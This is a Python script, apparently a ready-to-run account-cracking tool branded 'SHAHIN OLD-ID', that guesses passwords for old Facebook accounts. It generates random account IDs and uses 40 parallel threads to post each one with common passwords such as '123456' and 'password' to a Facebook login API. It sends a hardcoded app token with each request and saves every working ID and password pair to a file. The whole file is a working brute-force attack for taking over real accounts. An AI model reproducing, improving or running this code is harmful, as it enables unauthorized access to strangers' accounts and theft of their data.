import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Colors
A = '\033[1;97m' 
G = '\033[1;92m' 
Y = '\033[1;93m' 
S = '\033[1;96m' 

loop, oks, cps = 0, [], []

def line():
    print(f'{S}╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸{A}')

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}OLD-ID{A}''')
    line()
    print(f' {A}[{G}•{A}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {A}[{G}•{A}] TARGET   : {Y}2004 - 2010 OLD IDS')
    print(f' {A}[{G}•{A}] STATUS   : {G}VIP OLD ENGINE ACTIVE')
    line()

def Main():
    logo()
    print(f' {G}[1]{A} CLONE 2004-2005 IDS {Y}(10000...)')
    print(f' {G}[2]{A} CLONE 2006-2008 IDS {Y}(100000...)')
    print(f' {G}[3]{A} CLONE 2009-2010 IDS {Y}(1000000...)')
    print(f' {G}[4]{A} CLONE FROM FILE {S}(UID FILE)')
    print(f' {G}[0]{A} EXIT')
    line()
    opt = input(f' {A}[{G}•{A}] CHOOSE : {G}')
    
    if opt == '1': old_crack("10000", 5)
    elif opt == '2': old_crack("100000", 6)
    elif opt == '3': old_crack("1000000", 7)
    elif opt == '4': file_clone()
    else: exit()

def old_crack(prefix, digit):
    logo()
    limit = int(input(f' {A}[{G}+] LIMIT (e.g 5000): {G}'))
    with ThreadPool(max_workers=40) as old_engine:
        logo()
        print(f' {A}[{G}•{A}] CRACKING OLD IDS...')
        line()
        for _ in range(limit):
            # Generating Old UID Pattern
            uid = prefix + ''.join(random.choice(string.digits) for _ in range(digit))
            # Old IDs often have very simple passwords
            pws = ['123456', '1234567', '12345678', '123456789', 'password', 'facebook', '112233', 'qwerty']
            old_engine.submit(engine_old, uid, pws, limit)

def engine_old(uid, pws, limit):
    global loop
    # Using specific headers for Old ID bypass
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            url = 'https://b-api.facebook.com/method/auth.login'
            res = session.post(url, data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G}[SHAHIN-OLD-OK] {uid} | {pw}{A}')
                oks.append(uid)
                open('SHAHIN-OLD.txt', 'a').write(uid+'|'+pw+'\n')
                break
        except: pass
    loop += 1
    sys.stdout.write(f'\r\r {A}[OLD-SCAN] {loop}/{limit} OK:{G}{len(oks)}{A} '); sys.stdout.flush()

if __name__ == "__main__":
    Main()
    
